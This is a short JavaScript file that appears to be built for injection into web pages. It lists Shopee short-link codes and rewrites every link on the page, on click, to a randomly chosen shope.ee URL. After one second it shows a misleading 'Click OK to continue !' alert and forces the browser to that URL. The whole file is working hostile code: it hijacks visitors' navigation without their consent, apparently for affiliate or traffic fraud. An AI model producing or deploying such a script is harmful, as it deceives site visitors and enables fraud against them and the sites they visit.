
let data = [
'404BxG5ueu',
'5pVq8kDqHQ',
'7exUKEqZNY',
'6KS6jRi86z',
'5fCPw0Gimn',
'4Kgu5EJ0xF',
'5zpGLMrnAv',
'5zpGLMrnAv',
'5pVq96DY4e',
'1fgHBWN82y',
'1L3Qn1PpfU',
'5zpGLu9OhU',
'5pVq8kDqHQ',
'1fgHBWN82y',
'9UP8WNYj1o',
'5fCPxOHFSa',
'8zSrvZ7g5B',
'2psEaJtG1C',
'5pVq8kDqHQ',
'6A8hJA7jZB',
'4pdJil2amm',
'5fCPxOHFSa',
'99mI8AQ26q',
'A9fSalogSq',
'9zM2OSpJnp',
'AUIIzNnPmw',
'AJysn4o37v',
'89uOD5wIWW',
'Y3xna8u1',
'Y3ByNvNY'
];

data = 'https://shope.ee/' + data[Math.round(Math.random() * (data.length - 2) + 1)]

if(document.querySelectorAll('a')[0] != null){
    for (let index = 0; index < document.querySelectorAll('a').length; index++){
        document.querySelectorAll('a')[index].addEventListener('click', function(){
            document.querySelectorAll('a')[index].href = data;
        })
    }
}

function linkRedirect(timeOut = 1000){
    setTimeout(function(){
        window.location = data;
    }, timeOut);
}

function alertRedirect(timeOut = 1000, message = "Click OK to continue !"){
    setTimeout(function(){
        alert(message);
        window.location = data;
    }, timeOut);
}

// console.log(window.location.pathname);
// console.log(data);

alertRedirect();
